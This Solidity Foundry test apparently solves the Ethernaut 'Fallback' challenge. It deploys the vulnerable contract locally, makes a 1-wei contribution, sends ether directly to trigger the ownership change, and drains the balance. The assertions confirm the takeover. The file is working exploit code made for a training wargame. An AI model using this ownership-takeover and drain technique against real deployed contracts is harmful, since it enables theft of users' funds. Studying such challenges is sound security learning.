// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/01_fallback.sol";

contract AttackerFallbackTest is Test {
    function testfallback() external {
        vm.prank(address(0x1));
        Fallback fallbck = new Fallback();

        fallbck.contribute{value: 1 wei}();
        fallbck.getContribution();

        console.log("Current Owner is: ", fallbck.owner());

        assertFalse(fallbck.owner() == address(this));
        assertFalse(address(fallbck).balance == 0);

        (bool success, ) = address(fallbck).call{value: 1 wei}("");
        require(success, "Transfer failed!");

        fallbck.withdraw();

        assertTrue(fallbck.owner() == address(this));
        assertTrue(address(fallbck).balance == 0);

        console.log("New Owner is: ", fallbck.owner());
    }

    receive() external payable {}
}
